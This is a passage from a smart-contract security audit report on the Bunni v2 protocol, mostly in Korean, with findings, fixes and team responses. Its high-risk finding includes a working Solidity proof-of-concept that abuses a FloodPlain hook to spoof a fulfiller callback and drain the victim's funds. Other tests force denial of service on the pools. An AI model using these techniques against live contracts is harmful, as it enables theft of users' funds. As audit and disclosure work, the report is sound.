**Cyfrin:** 인지됨(Acknowledged). 이는 서지 수수료(surge fee)가 스와퍼에게 더 이상 불리하지 않을 때까지 목표 비율에 대한 입금이 발생하지 않기 때문에 잠재적 수익률의 정기적인 손실을 초래할 것이지만, 후속 스왑이 입금을 트리거할 것이라는 점이 받아들여지는 것으로 이해됩니다.

\clearpage
## High Risk


### `FloodPlain` selector extension does not prevent `IFulfiller::sourceConsideration` callback from being called within pre/post hooks

**Description:** `FloodPlain` 계약은 pre/post 후크 실행 중에 이행자(fulfiller) 콜백을 호출하여 스푸핑(spoofing)을 방지하려는 확인을 `Hooks::execute`에 구현합니다:

```solidity
    bytes28 constant SELECTOR_EXTENSION = bytes28(keccak256("IFulfiller.sourceConsiderations"));

    library Hooks {
        function execute(IFloodPlain.Hook calldata hook, bytes32 orderHash, address permit2) internal {
            address target = hook.target;
            bytes calldata data = hook.data;

            bytes28 extension; // @audit - an attacker can control this value to pass the below check
```solidity
            assembly ("memory-safe") {
                extension := shl(32, calldataload(data.offset)) // @audit - this shifts off the first 4 bytes of the calldata, which is the `sourceConsideration()` function selector. thus preventing a call to either `sourceConsideration()` or `sourceConsiderations()` relies on the fulfiller requiring the `selectorExtension` argument to be `SELECTOR_EXTENSION`
            }
@>          require(extension != SELECTOR_EXTENSION && target != permit2, "MALICIOUS_CALL");

            assembly ("memory-safe") {
                let fmp := mload(0x40)
                calldatacopy(fmp, data.offset, data.length)
                mstore(add(fmp, data.length), orderHash)
                if iszero(call(gas(), target, 0, fmp, add(data.length, 32), 0, 0)) {
                    returndatacopy(0, 0, returndatasize())
                    revert(0, returndatasize())
                }
            }
        }
        ...
    }
```

그러나 `SELECTOR_EXTENSION` 상수는 해시된 함수 서명을 실제로 포함하지 않으므로 일종의 "매직 밸류(magic value)" 역할만 합니다. 따라서 이행자(fulfiller)가 선택자 확장 인자를 이 예상 값과 검증한다고 가정할 때, 이는 `IFulfiller.sourceConsideration`이 아닌 `IFulfiller::sourceConsiderations` 인터페이스를 사용하는 호출만 방지합니다. 따라서 악의적인 Flood 주문이 이행되어 전/후 후크 실행 중에 임의의 외부 호출을 실행하여 피해자 이행자를 표적으로 삼는 데 사용될 수 있습니다. 호출자가 명시적으로 검증되지 않은 경우, 이 호출이 이행자에 의해 수락되어 잠재적으로 나중에 악용될 수 있는 댕글링 승인(dangling approvals)이 발생할 수 있습니다. 또한 `FloodPlain::fulfillOrder`의 두 오버로드된 버전 모두에서 `IFulfiller::sourceConsideration` 콜백에 동일한 선택자 확장이 전달되는데, 이는 표면적으로 `bytes28(keccak256("IFulfiller.sourceConsideration"))`이어야 합니다.

코드는 현재 공개되지 않았지만, `msg.sender`가 Flood 계약인지만 확인하고 `selectorExtension` 및 `caller` 매개변수를 무시하는 Bunni 리밸런서(rebalancer)의 경우가 그렇습니다. 결과적으로 공격자가 제어하는 주소를 디코딩하도록 속여 오퍼 토큰에 대해 무한 승인을 하도록 만들 수 있습니다. 악의적인 Flood 주문은 Flood 주문과 동반 컨텍스트를 모두 자유롭게 제어할 수 있으므로 리밸런서가 보유한 모든 토큰 인벤토리를 탈취할 수 있습니다.

**Impact:** 악의적인 Flood 주문은 전/후 후크 실행 중에 `IFulfiller::sourceConsideration` 콜백을 호출하여 `FloodPlain` 주소를 스푸핑할 수 있습니다.

**Proof of Concept:** 다음 테스트를 `Hooks.t.sol`의 Flood.bid 라이브러리 테스트에 추가할 수 있습니다:

```solidity
function test_RevertWhenSelectorExtensionClashSourceConsideration(
        bytes4 data0,
        bytes calldata data2,
        bytes32 orderHash,
        address permit2
    ) public {
        vm.assume(permit2 != hooked);
        bytes28 data1 = bytes28(keccak256("IFulfiller.sourceConsideration")); // note the absence of the final 's'
        bytes memory data = abi.encodePacked(data0, data1, data2);

        // this actually succeeds, so it is possible to call sourceConsideration on the fulfiller from the hook
        // with FloodPlain as the sender and any arbitrary caller before the consideration is actually sourced
        // which can be used to steal approvals from other contracts that integrate with FloodPlain
        hookHelper.execute(IFloodPlain.Hook({target: address(0x6969696969), data: data}), orderHash, permit2);
    }
```

그리고 아래의 독립형 테스트 파일은 전체 엔드 투 엔드 문제를 보여줍니다:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "test/utils/FloodPlainTestShared.sol";

import {PermitHash} from "permit2/src/libraries/PermitHash.sol";
import {OrderHash} from "src/libraries/OrderHash.sol";

import {IFloodPlain} from "src/interfaces/IFloodPlain.sol";
import {IFulfiller} from "src/interfaces/IFulfiller.sol";
import {SELECTOR_EXTENSION} from "src/libraries/Hooks.sol";

import {IERC20, SafeERC20} from "@openzeppelin/token/ERC20/utils/SafeERC20.sol";
import {Address} from "@openzeppelin/utils/Address.sol";

contract ThirdPartyFulfiller is IFulfiller {
    using SafeERC20 for IERC20;
    using Address for address payable;

    function sourceConsideration(
        bytes28 selectorExtension,
        IFloodPlain.Order calldata order,
        address, /* caller */
        bytes calldata /* context */
    ) external returns (uint256) {
        require(selectorExtension == bytes28(keccak256("IFulfiller.sourceConsideration")));

        IFloodPlain.Item calldata item = order.consideration;
        if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
        else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);

        return item.amount;
    }

    function sourceConsiderations(
        bytes28 selectorExtension,
        IFloodPlain.Order[] calldata orders,
        address, /* caller */
        bytes calldata /* context */
    ) external returns (uint256[] memory amounts) {
        require(selectorExtension == SELECTOR_EXTENSION);

        uint256[] memory amounts = new uint256[](orders.length);

        for (uint256 i; i < orders.length; ++i) {
            IFloodPlain.Order calldata order = orders[i];
            IFloodPlain.Item calldata item = order.consideration;
            amounts[i] = item.amount;
            if (item.token == address(0)) payable(msg.sender).sendValue(item.amount);
            else IERC20(item.token).safeIncreaseAllowance(msg.sender, item.amount);
        }
    }
}

contract FloodPlainPoC is FloodPlainTestShared {
    IFulfiller victimFulfiller;

    function setUp() public override {
        super.setUp();
        victimFulfiller = new ThirdPartyFulfiller();
    }

    function test_FraudulentPreHookSourceConsideration() public {
        // create a malicious order that will call out to a third-party fulfiller in the pre hook
        // just copied the setup_mostBasicOrder logic for simplicity but this can be a fake order with fake tokens
        // since it is only the pre hook execution that is interesting here

        deal(address(token0), account0.addr, token0.balanceOf(account0.addr) + 500);
        deal(address(token1), address(fulfiller), token1.balanceOf(address(fulfiller)) + 500);
        IFloodPlain.Item[] memory offer = new IFloodPlain.Item[](1);
        offer[0].token = address(token0);
        offer[0].amount = 500;
        uint256 existingAllowance = token0.allowance(account0.addr, address(permit2));
        vm.prank(account0.addr);
        token0.approve(address(permit2), existingAllowance + 500);
        IFloodPlain.Item memory consideration;
        consideration.token = address(token1);
        consideration.amount = 500;

        // fund the victim fulfiller with native tokens that we will have it transfer out as the "consideration"
        uint256 targetAmount = 10 ether;
        deal(address(victimFulfiller), targetAmount);
        assertEq(address(victimFulfiller).balance, targetAmount);

        IFloodPlain.Item memory evilConsideration;
        evilConsideration.token = address(0);
        evilConsideration.amount = targetAmount;

        // now set up the spoofed sourceConsideration call (note the offer doesn't matter as this is not a legitimate order)
        IFloodPlain.Hook[] memory preHooks = new IFloodPlain.Hook[](1);
        IFloodPlain.Order memory maliciousOrder = IFloodPlain.Order({
            offerer: address(account0.addr),
            zone: address(0),
            recipient: account0.addr,
            offer: offer,
            consideration: evilConsideration,
            deadline: type(uint256).max,
            nonce: 0,
            preHooks: new IFloodPlain.Hook[](0),
            postHooks: new IFloodPlain.Hook[](0)
        });
        preHooks[0] = IFloodPlain.Hook({
            target: address(victimFulfiller),
            data: abi.encodeWithSelector(IFulfiller.sourceConsideration.selector, bytes28(keccak256("IFulfiller.sourceConsideration")), maliciousOrder, address(0), bytes(""))
        });

        // Construct the fraudulent order.
        IFloodPlain.Order memory order = IFloodPlain.Order({
            offerer: address(account0.addr),
            zone: address(0),
            recipient: account0.addr,
            offer: offer,
            consideration: consideration,
            deadline: type(uint256).max,
            nonce: 0,
            preHooks: preHooks,
            postHooks: new IFloodPlain.Hook[](0)
        });

        // Sign the order.
        bytes memory sig = getSignature(order, account0);

        IFloodPlain.SignedOrder memory signedOrder = IFloodPlain.SignedOrder({order: order, signature: sig});

        deal(address(token1), address(this), 500);
        token1.approve(address(book), 500);

        // Filling order succeeds and pre hook call invoked sourceConsideration on the vitim fulfiller.
        book.fulfillOrder(signedOrder);
        assertEq(address(victimFulfiller).balance, 0);
    }
}
```

**Recommended Mitigation:** 0x에 의한 Flood.bid의 [최근 인수](https://0x.org/post/0x-acquires-flood-to-optimize-trade-execution) 이후, 이 계약들은 더 이상 유지 관리되지 않는 것으로 보입니다. 따라서 업스트림 변경을 요구하지 않고도 `IFulfiller::sourceConsideration` 및 `IFulfiller::sourceConsiderations` 구현 모두에서 `selectorExtension` 인자가 `SELECTOR_EXTENSION` 상수와 동일한지 항상 검증함으로써 이 문제를 완화할 수 있습니다.

**0x:**
`SELECTOR_EXTENSION`의 실제 값은 유감스럽지만 코드의 의도는 존중되고 안전하며, 이행자가 시스템의 "전문가" 행위자가 되어 보안을 잘 처리할 것으로 기대됩니다.

**Bacon Labs:** 인지됨(Acknowledged). 나중에 리밸런서 계약에서 이를 수정할 예정입니다. 현실적으로 우리의 리밸런서는 주문 실행 중을 제외하고는 인벤토리를 보유하지 않으므로 현재로서는 영향이 없습니다.

**Cyfrin:** 인지됨(Acknowledged).

\clearpage
## Medium Risk


### Hooklet token transfer hooks will reference the incorrect sender due to missing use of `LibMulticaller.senderOrSigner()`

**Description:** `LibMulticaller`는 멀티콜 트랜잭션의 실제 발신자를 검색하기 위해 코드베이스 전체에서 사용됩니다. 그러나 `BunniToken::_beforeTokenTransfer` 및 `BunniToken::_afterTokenTransfer`는 모두 잘못해서 `msg.sender`를 해당 Hooklet 함수에 직접 전달합니다:

```solidity
function _beforeTokenTransfer(address from, address to, uint256 amount, address newReferrer) internal override {
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.BEFORE_TRANSFER_FLAG)) {
        hooklet_.hookletBeforeTransfer(msg.sender, poolKey(), this, from, to, amount);
    }
}

function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
    // call hooklet
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
        hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
    }
}
```

**Impact:** Hooklet 호출은 잘못된 발신자를 참조합니다. 이는 멀티콜 트랜잭션에서 잘못된 주소로 사용자 지정 로직이 실행되므로 통합자에게 잠재적으로 심각한 다운스트림 영향을 미칩니다.

**Recommended Mitigation:** 실제 발신자가 필요한 곳마다 `msg.sender` 대신 `LibMulticaller.senderOrSigner()`를 사용해야 합니다:

```diff
function _beforeTokenTransfer(address from, address to, uint256 amount, address newReferrer) internal override {
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.BEFORE_TRANSFER_FLAG)) {
--      hooklet_.hookletBeforeTransfer(msg.sender, poolKey(), this, from, to, amount);
++      hooklet_.hookletBeforeTransfer(LibMulticaller.senderOrSigner(), poolKey(), this, from, to, amount);
    }
}

function _afterTokenTransfer(address from, address to, uint256 amount) internal override {
    // call hooklet
    IHooklet hooklet_ = hooklet();
    if (hooklet_.hasPermission(HookletLib.AFTER_TRANSFER_FLAG)) {
--      hooklet_.hookletAfterTransfer(msg.sender, poolKey(), this, from, to, amount);
++      hooklet_.hookletAfterTransfer(LibMulticaller.senderOrSigner(), poolKey(), this, from, to, amount);
    }
}
```

**Bacon Labs:** [PR \#106](https://github.com/timeless-fi/bunni-v2/pull/106)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 `BunniToken` Hooklet 호출에서 `msg.sender`를 전달하기 위해 `LibMulticaller`가 사용됩니다.


### Broken block time assumptions affect am-AMM epoch duration and can DoS rebalancing on Arbitrum

**Description:** `AmAmm`은 블록 단위의 경매 지연 매개변수를 지정하는 다음 가상 함수를 정의합니다:

```solidity
function K(PoolId) internal view virtual returns (uint48) {
    return 7200;
}
```

여기서 `7200`은 12초 이더리움 메인넷 블록 시간을 가정합니다. 이는 24시간 에포크에 해당하며 모든 체인에 대한 의도된 기간입니다. 체인마다 블록 시간이 다르므로 `BunniHook`에서 이 함수를 재정의하여 불변 매개변수 `_K`의 값을 반환합니다:

```solidity
uint48 internal immutable _K;

function K(PoolId) internal view virtual override returns (uint48) {
    return _K;
}
```

각 체인에서 사용되는 값은 `.env.example`에서 볼 수 있습니다:

```env
# Mainnet
AMAMM_K_1=7200

# Arbitrum
AMAMM_K_42161=345600

# Base
AMAMM_K_8453=43200

# Unichain
AMAMM_K_130=86400
```

그러나 이 구성에는 여러 문제가 있습니다.

첫째, Base의 `_K` 매개변수 값은 현재 2초 블록 시간을 올바르게 가정하고 있지만, 이 값은 [올해 말 예상되는](https://www.theblock.co/post/343908/base-cuts-block-times-to-0-2-seconds-on-testnet-with-flashblocks-mainnet-rollout-expected-in-q2) 0.2초 블록 시간으로 감소함에 따라 변경될 수 있고 변경될 것입니다. 지나치게 빈번하지는 않지만 블록 시간 감소는 흔한 일이며 예상해야 합니다. 예를 들어 이더리움이 지분 증명(Proof of Stake)으로 전환할 때 평균 블록 시간이 13초에서 12초로 감소했고, 아비트럼(Arbitrum)은 2초에서 0.25초로(선택된 아비트럼 체인에서는 0.1초까지 구성 가능) 감소했습니다. 따라서 `_K`는 불변이 아니어야 하며 모든 체인에서 계약 관리자가 구성할 수 있어야 합니다.

둘째, 아비트럼의 `_K` 매개변수 값은 가정된 기본 0.25초 블록 시간에 대해 정확하지만, `block.number`가 잘못해서 [L1 조상 블록을 참조](https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/block-numbers-and-time)하기 때문에 L2 블록 번호는 로직에서 사용되지 않습니다. 결과적으로 아비트럼의 에포크 기간은 예상보다 훨씬 긴 1152시간(48일)이며, 이는 활성화된 후크의 경우 LVR 경매의 기능과 입찰자 모두에게 심각한 혼란을 야기할 것입니다. `block.number`를 사용할 때 L2 블록 번호를 직접 반환하는 Base 및 Unichain과 같은 OP Stack 체인의 경우에는 그렇지 않습니다.

잘못된 아비트럼 `block.number` 가정의 또 다른 의미는 `RebalanceLogic`에서 리밸런스 주문을 생성할 때의 사용에 있습니다:

```solidity
IFloodPlain.Order memory order = IFloodPlain.Order({
    offerer: address(this),
    zone: address(env.floodZone),
    recipient: address(this),
    offer: offer,
    consideration: consideration,
    deadline: block.timestamp + rebalanceOrderTTL,
    nonce: uint256(keccak256(abi.encode(block.number, id))), // combine block.number and pool id to avoid nonce collisions between pools
    preHooks: preHooks,
    postHooks: postHooks
});
```

인라인 주석에서 알 수 있듯이, 블록 번호만 사용된 경우 특정 블록에서 특정 풀에 대한 리밸런스 주문 생성이 다른 풀에 대한 주문 생성을 방해할 수 있으므로 풀 간 넌스(nonce) 충돌을 방지하기 위해 블록 번호가 풀 ID와 해시됩니다. 이 로직은 대부분의 체인에서 잘 작동하여 풀당 블록당 단일 리밸런스 주문을 생성할 수 있습니다. 그러나 아비트럼에서 실수로 L1 블록 번호를 참조함으로써 이 로직은 동일한 넌스를 가진 주어진 풀 ID에 대해 Permit2에서 지속적으로 DoS 문제를 일으킬 것입니다. 아비트럼 L2 블록이 전진하여 추가 리밸런싱이 필요할 수 있지만, 하나의 L1 블록이 생성되는 데 걸리는 시간에 약 48개의 L2 블록이 생성되므로 시도된 주문은 동일한 L1 조상 블록을 참조할 가능성이 매우 높습니다.

**Impact:** 아비트럼 L2 블록 번호의 부적절한 처리는 am-AMM 기능 및 리밸런스 주문 모두에서 Bunni Hook의 서비스 거부(DoS)를 초래합니다.

**Recommended Mitigation:** * 블록 시간의 변경 사항에 적응할 수 있도록 모든 체인에서 계약 관리자가 `_K` 매개변수를 구성할 수 있도록 허용하십시오.
* L2 블록을 올바르게 참조하기 위해 ArbSys L2 블록 번호 프리컴파일을 사용하십시오.

**Bacon Labs:** [PR \#99](https://github.com/timeless-fi/bunni-v2/pull/99) 및 [`PR [*Token transfer hooks should be invoked at the end of execution to prevent the hooklet executing over intermediate state*](#token-transfer-hooks-should-be-invoked-at-the-end-of-execution-to-prevent-the-hooklet-executing-over-intermediate-state)`](https://github.com/Bunniapp/biddog/pull/6)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 리밸런스 주문 및 기본 `AmAmm` 구현 모두 이제 ArbSys 프리컴파일을 쿼리하여 올바른 아비트럼 블록 번호를 반환합니다. K 변경을 예약하는 로직도 추가되었습니다. 현재 소유자는 현재 블록에서 변경 사항이 활성화되도록 예약할 수 있으며, 이는 시간 지연 없이 즉시 새 K를 업데이트합니다. 대신 활성 블록이 허용 가능한 범위의 미래 블록 내에 있는지 검증하고, 변경과 새 K 활성화 사이에 약간의 시간 지연이 있도록 최소 블록 수를 설정하는 것이 좋습니다. 또한 소유자는 보류 중인 K의 활성 블록을 줄일 수 있는데, 이 또한 허용되어서는 안 됩니다. 예를 들어 블록 100에서 새 K가 활성화되도록 예약한 경우 활성 블록 50으로 동일한 K를 예약할 수 있으며 이는 재정의됩니다.

**Bacon Labs:** 이 동작은 의도된 것입니다. 체인이 블록 시간 업데이트를 미리 공지하지 않고 그냥 수행한 경우 K를 즉시 업데이트할 수 있어야 합니다. 체인이 블록 시간 업데이트 일정을 변경하는 경우 활성 블록을 재정의할 수 있는 것도 필요합니다.

**Cyfrin:** 인지됨(Acknowedged).


### DoS of Bunni pools when raw balance is outside limits but vaults do not accept additional deposits

**Description:** `BunniHub`의 `rawBalance`가 `maxRawTokenRatio`를 초과하면 `targetRawTokenRatio`에 도달하기 위해 해당 볼트에 입금을 시도합니다. 이를 위해 `_updateRawBalanceIfNeeded()` 함수가 호출되며, 이 함수는 차례로 `_updateVaultReserveViaClaimTokens()`를 호출합니다:

```solidity
    function _updateRawBalanceIfNeeded(
        Currency currency,
        ERC4626 vault,
        uint256 rawBalance,
        uint256 reserve,
        uint256 minRatio,
        uint256 maxRatio,
        uint256 targetRatio
    ) internal returns (uint256 newReserve, uint256 newRawBalance) {
        uint256 balance = rawBalance + getReservesInUnderlying(reserve, vault);
        uint256 minRawBalance = balance.mulDiv(minRatio, RAW_TOKEN_RATIO_BASE);
        uint256 maxRawBalance = balance.mulDiv(maxRatio, RAW_TOKEN_RATIO_BASE);

        if (rawBalance < minRawBalance || rawBalance > maxRawBalance) {
            uint256 targetRawBalance = balance.mulDiv(targetRatio, RAW_TOKEN_RATIO_BASE);
            (int256 reserveChange, int256 rawBalanceChange) =
@>              _updateVaultReserveViaClaimTokens(targetRawBalance.toInt256() - rawBalance.toInt256(), currency, vault);
            newReserve = _updateBalance(reserve, reserveChange);
            newRawBalance = _updateBalance(rawBalance, rawBalanceChange);
        } else {
            (newReserve, newRawBalance) = (reserve, rawBalance);
        }
    }

    function _updateVaultReserveViaClaimTokens(int256 rawBalanceChange, Currency currency, ERC4626 vault)
        internal
        returns (int256 reserveChange, int256 actualRawBalanceChange)
    {
        uint256 absAmount = FixedPointMathLib.abs(rawBalanceChange);
        if (rawBalanceChange < 0) {
            uint256 maxDepositAmount = vault.maxDeposit(address(this));
            // if poolManager doesn't have enough tokens or we're trying to deposit more than the vault accepts
            // then we only deposit what we can
            // we're only maintaining the raw balance ratio so it's fine to deposit less than requested
            uint256 poolManagerReserve = currency.balanceOf(address(poolManager));
            absAmount = FixedPointMathLib.min(FixedPointMathLib.min(absAmount, maxDepositAmount), poolManagerReserve);

            // burn claim tokens from this
            poolManager.burn(address(this), currency.toId(), absAmount);

            // take tokens from poolManager
            poolManager.take(currency, address(this), absAmount);

            // deposit tokens into vault
            IERC20 token;
            if (currency.isAddressZero()) {
                // wrap ETH
                weth.deposit{value: absAmount}();
                token = IERC20(address(weth));
            } else {
                token = IERC20(Currency.unwrap(currency));
            }
            address(token).safeApproveWithRetry(address(vault), absAmount);
            // @audit this will fail for tokens that revert on 0 token transfers or ERC4626 vaults that does not allow 0 asset deposits
@>          reserveChange = vault.deposit(absAmount, address(this)).toInt256();

            // it's safe to use absAmount here since at worst the vault.deposit() call pulled less token
            // than requested
            actualRawBalanceChange = -absAmount.toInt256();

            // revoke token approval to vault if necessary
            if (token.allowance(address(this), address(vault)) != 0) {
                address(token).safeApprove(address(vault), 0);
            }
        } else if (rawBalanceChange > 0) {
            ...
        }
    }
```

볼트에 raw 밸런스 입금을 시도할 때 입금하려는 금액, 볼트가 반환한 최대 입금액, Uniswap v4 Pool Manager 준비금 간의 최소값이 계산됩니다. ERC-4626 볼트가 예치된 자산의 최대 금액에 도달하여 0 자산을 반환하면 볼트에 입금할 금액은 0이 됩니다. 이는 다음과 같은 여러 가지 이유로 문제가 될 수 있습니다:
1. 0 자산 예치를 허용하지 않는 볼트가 있습니다.
2. 0 주식(shares) 발행 시 되돌리는(revert) 볼트가 있습니다.
3. 0 전송 시 되돌리는 토큰이 있습니다.

이는 0 자산을 볼트에 입금하려는 시도가 이루어져 되돌려지기 때문에 raw 밸런스가 너무 높을 때 DoS를 초래합니다. 대신 `_depositVaultReserve()` 함수에서 수행되는 것처럼 입금할 금액이 0일 때 입금 함수 호출을 피해야 합니다.

```solidity
if (address(state.vault0) != address(0) && reserveAmount0 != 0) {
    (uint256 reserveChange, uint256 reserveChangeInUnderlying, uint256 amountSpent) = _depositVaultReserve(
        env, reserveAmount0, params.poolKey.currency0, state.vault0, msgSender, params.vaultFee0
    );
    s.reserve0[poolId] = state.reserve0 + reserveChange;

    // use actual withdrawable value to handle vaults with withdrawal fees
    reserveAmount0 = reserveChangeInUnderlying;

    // add amount spent on vault deposit to the total amount spent
    amount0Spent += amountSpent;
}
```

`reserveAmount0`는 볼트에 입금되도록 계산된 금액이므로 0이면 입금 실행이 무시됩니다.

**Proof of Concept:** `ERC4626Mock`을 수정하여 `maxDeposit()`이 쿼리될 때 0을 반환하고 자산 한도에 도달한 ERC-4626 볼트를 시뮬레이션하고, 0 자산 예치를 시도할 때 되돌리도록 하십시오:

```solidity
contract ERC4626Mock is ERC4626 {
    address internal immutable _asset;
    mapping(address to => bool maxDepostitCapped) internal maxDepositsCapped;
    error ZeroAssetsDeposit();

    constructor(IERC20 asset_) {
        _asset = address(asset_);
    }

    function deposit(uint256 assets, address to) public override returns (uint256 shares) {
        if(assets == 0) revert ZeroAssetsDeposit();
        return super.deposit(assets, to);
    }

    function setMaxDepositFor(address to) external {
        maxDepositsCapped[to] = true;
    }

    function maxDeposit(address to) public view override returns (uint256 maxAssets) {
        if(maxDepositsCapped[to]){
            return 0;
        } else {
            return super.maxDeposit(to);
        }
    }

    function asset() public view override returns (address) {
        return _asset;
    }

    function name() public pure override returns (string memory) {
        return "MockERC4626";
    }

    function symbol() public pure override returns (string memory) {
        return "MOCK-ERC4626";
    }
}
```

이제 다음 테스트를 `BunniHook.t.sol` 내에 배치할 수 있습니다:

```solidity
function test_PoCVaultDoS() public {
    Currency currency0 = Currency.wrap(address(token0));
    Currency currency1 = Currency.wrap(address(token1));
    ERC4626 vault0_ = vault0;
    ERC4626 vault1_ = vault1;

    (, PoolKey memory key) = _deployPoolAndInitLiquidity(currency0, currency1, vault0_, vault1_);

    uint256 inputAmount = PRECISION / 10;

    _mint(key.currency0, address(this), inputAmount);
    uint256 value = key.currency0.isAddressZero() ? inputAmount : 0;

    IPoolManager.SwapParams memory params = IPoolManager.SwapParams({
        zeroForOne: true,
        amountSpecified: -int256(inputAmount),
        sqrtPriceLimitX96: TickMath.getSqrtPriceAtTick(3)
    });

    // Set up conditions
    // 1. Ensure that raw balance is greater than the max, hence it would need to trigger the vault
    // deposit
    uint256 amountOfAssetsToBurn = vault0.balanceOf(address(hub)) / 3;
    vm.prank(address(hub));
    vault0.transfer(address(0xdead), amountOfAssetsToBurn);
    // 2. Ensure maxDeposit is 0
    vault0.setMaxDepositFor(address(hub));

    vm.expectRevert(
        abi.encodeWithSelector(
            WrappedError.selector,
            address(bunniHook),
            BunniHook.beforeSwap.selector,
            abi.encodePacked(ERC4626Mock.ZeroAssetsDeposit.selector),
            abi.encodePacked(bytes4(keccak256("HookCallFailed()")))
        )
    );
    _swap(key, params, value, "swap");
}
```

ERC-4626 볼트에 설정된 `ZeroAssetsDeposit()` 사용자 지정 오류로 인한 되돌리기는 Uniswap v4 `WrappedError()`에 래핑되어 관찰될 수 있습니다.

**Impact:** Bunni 풀은 볼트가 더 많은 예금을 수락할 때까지 스왑 및 리밸런싱에 대한 서비스 거부(DoS) 상태에 들어갑니다.

**Recommended Mitigation:** 입금할 금액이 0이면 입금 실행을 무시하십시오:

```diff
function _updateVaultReserveViaClaimTokens(int256 rawBalanceChange, Currency currency, ERC4626 vault)
        internal
        returns (int256 reserveChange, int256 actualRawBalanceChange)
    {
        uint256 absAmount = FixedPointMathLib.abs(rawBalanceChange);
        if (rawBalanceChange < 0) {
            uint256 maxDepositAmount = vault.maxDeposit(address(this));
            // if poolManager doesn't have enough tokens or we're trying to deposit more than the vault accepts
            // then we only deposit what we can
            // we're only maintaining the raw balance ratio so it's fine to deposit less than requested
            uint256 poolManagerReserve = currency.balanceOf(address(poolManager));
            absAmount = FixedPointMathLib.min(FixedPointMathLib.min(absAmount, maxDepositAmount), poolManagerReserve);

++          if(absAmount == 0) return(0, 0);

            // burn claim tokens from this
            poolManager.burn(address(this), currency.toId(), absAmount);

            // take tokens from poolManager
            poolManager.take(currency, address(this), absAmount);

            // deposit tokens into vault
            IERC20 token;
            if (currency.isAddressZero()) {
                // wrap ETH
                weth.deposit{value: absAmount}();
                token = IERC20(address(weth));
            } else {
                token = IERC20(Currency.unwrap(currency));
            }
            address(token).safeApproveWithRetry(address(vault), absAmount);
            reserveChange = vault.deposit(absAmount, address(this)).toInt256();

            // it's safe to use absAmount here since at worst the vault.deposit() call pulled less token
            // than requested
            actualRawBalanceChange = -absAmount.toInt256();

            // revoke token approval to vault if necessary
            if (token.allowance(address(this), address(vault)) != 0) {
                address(token).safeApprove(address(vault), 0);
            }
        } else if (rawBalanceChange > 0) {
            ...
        }
    }
```

**Bacon Labs:** [PR \#96](https://github.com/timeless-fi/bunni-v2/pull/96)에서 수정되었습니다.

**Cyfrin:** 검증되었습니다. 이제 추가 입금이 불가능한 경우 실행이 조기 반환됩니다.


### DoS of Bunni pools configured with dynamic LDFs due to insufficient validation of post-shift tick bounds

**Description:** `LibUniformDistribution::decodeParams`와 달리 최소/최대 사용 가능 틱은 `UniformDistribution::query`에 의해 검증되지 않습니다. 유동성 위치의 최대 길이는 $\text{tick} \in [minUsableTick, maxUsableTick]$에 해당하지만, `enforceShiftMode()` 모드 호출이 원하지 않는 시프트 방향을 고려하여 `lastTickLower`를 반환하는 경우 충분히 큰 `tickLength`에 대해 `tickUpper`가 `maxUsableTick`을 초과할 수 있습니다:

```solidity
function query(
    PoolKey calldata key,
    int24 roundedTick,
    int24 twapTick,
    int24, /* spotPriceTick */
    bytes32 ldfParams,
    bytes32 ldfState
)
    external
    view
    override
    guarded
    returns (
        uint256 liquidityDensityX96_,
        uint256 cumulativeAmount0DensityX96,
        uint256 cumulativeAmount1DensityX96,
        bytes32 newLdfState,
        bool shouldSurge
    )
{
    (int24 tickLower, int24 tickUpper, ShiftMode shiftMode) =
        LibUniformDistribution.decodeParams(twapTick, key.tickSpacing, ldfParams);
    (bool initialized, int24 lastTickLower) = _decodeState(ldfState);
    if (initialized) {
        int24 tickLength = tickUpper - tickLower;
        tickLower = enforceShiftMode(tickLower, lastTickLower, shiftMode);
@>      tickUpper = tickLower + tickLength;
        shouldSurge = tickLower != lastTickLower;
    }
     (liquidityDensityX96_, cumulativeAmount0DensityX96, cumulativeAmount1DensityX96) =
        LibUniformDistribution.query(roundedTick, key.tickSpacing, tickLower, tickUpper);
    newLdfState = _encodeState(tickLower);
}
```

틱은 초기에 사용 가능한 틱 범위 내에 있는지 검증되지만, `tickUpper`는 단순히 `tickLower + tickLength`로 다시 계산됩니다. `tickLength` 및/또는 `tickLower`와 `lastTickLower` 사이에 강제된 시프트가 충분히 크면 시프트 조건이 충족될 때 해당 `tickLength`를 업데이트하지 않고 `tickLower`만 `lastTickLower`를 반환하도록 업데이트되므로 `tickUpper`가 사용 가능한 범위를 초과할 수 있습니다. 상위 틱이 `TickMath.MAX_TICK`을 초과하므로 `InvalidTick()`과 함께 되돌려집니다.

다음을 고려하십시오:
1. 동적 시프트 모드로 LDF를 초기화하는 동안 맨 처음 `tickLower`는 `minUsableTick + tickSpacing`으로 설정됩니다. 해당 `tickUpper`를 통해 이 분포는 사용 가능한 틱 범위 내로 제한됩니다.

```solidity
/// @return tickLower The lower tick of the distribution
/// @return tickUpper The upper tick of the distribution
function decodeParams(int24 twapTick, int24 tickSpacing, bytes32 ldfParams)
    internal
    pure
    returns (int24 tickLower, int24 tickUpper, ShiftMode shiftMode)
{
    shiftMode = ShiftMode(uint8(bytes1(ldfParams)));

    if (shiftMode != ShiftMode.STATIC) {
        // | shiftMode - 1 byte | offset - 3 bytes | length - 3 bytes |
        int24 offset = int24(uint24(bytes3(ldfParams << 8))); // offset of tickLower from the twap tick
        int24 length = int24(uint24(bytes3(ldfParams << 32))); // length of the position in rounded ticks
        tickLower = roundTickSingle(twapTick + offset, tickSpacing);
        tickUpper = tickLower + length * tickSpacing;

        // bound distribution to be within the range of usable ticks
        (int24 minUsableTick, int24 maxUsableTick) =
            (TickMath.minUsableTick(tickSpacing), TickMath.maxUsableTick(tickSpacing));
        if (tickLower < minUsableTick) {
            int24 tickLength = tickUpper - tickLower;
            tickLower = minUsableTick;
            tickUpper = int24(FixedPointMathLib.min(tickLower + tickLength, maxUsableTick));
        } else if (tickUpper > maxUsableTick) {
            int24 tickLength = tickUpper - tickLower;
            tickUpper = maxUsableTick;
